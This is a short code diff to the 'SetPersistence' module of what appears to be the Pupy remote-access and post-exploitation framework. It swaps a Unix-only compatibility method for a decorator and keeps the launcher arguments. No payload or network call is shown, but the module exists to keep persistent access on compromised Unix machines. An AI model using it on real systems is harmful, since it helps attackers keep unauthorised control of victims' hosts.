@@ -3,6 +3,8 @@ import os
 from pupylib.PupyModule import *
 
 __class_name__="SetPersistence"
+
+@compatibility("unix")
 def print_callback(data):
 	sys.stdout.write(data)
 	sys.stdout.flush()
@@ -17,9 +19,6 @@ NOTE: the pp.py script needs to be running with root privileges in order to modi
 		self.arg_parser.add_argument('--launcher', help='change the default launcher, ex: simple')
 		self.arg_parser.add_argument('--launcher-args', help='change the launcher default args')
 		
-	@unix_only
-	def is_compatible(self):
-		pass
 	def run(self, args):
 		if not args.launcher_args:
 			args.launcher_args=' '.join(self.client.get_conf()["launcher_args"])
